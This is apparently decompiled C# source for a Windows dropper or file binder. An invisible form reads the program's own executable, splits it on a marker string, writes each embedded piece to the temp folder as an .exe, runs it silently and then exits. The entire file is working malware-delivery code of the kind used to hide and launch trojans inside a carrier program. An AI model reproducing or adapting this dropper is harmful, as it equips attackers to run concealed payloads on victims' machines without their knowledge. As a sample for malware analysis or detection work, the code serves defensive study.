using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[DesignerGenerated]
internal class Form1 : Form
{
	private IContainer icontainer_0;

	private const string string_0 = "yallaybenzonatavud!";

	private int int_0;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		int_0 = 1;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				string tempPath = Path.GetTempPath();
				FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
				string text = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref text, -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				string[] array = Strings.Split(text, "yallaybenzonatavud!", -1, (CompareMethod)0);
				Conversions.ToString(array.Count());
				int num = array.Count();
				for (int i = 0; i <= num; i++)
				{
					FileSystem.FileOpen(3, tempPath + "\\oowoahh" + Conversions.ToString(int_0) + ".exe", (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					FileSystem.FilePut(3, array[int_0], -1L, false);
					FileSystem.FileClose(new int[1] { 3 });
					Process.Start(tempPath + "\\oowoahh" + Conversions.ToString(int_0) + ".exe");
					int_0++;
				}
				((Form)this).Close();
				ProjectData.EndApp();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				((Form)this).Close();
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
			((Form)this).Close();
			ProjectData.EndApp();
		}
	}
}
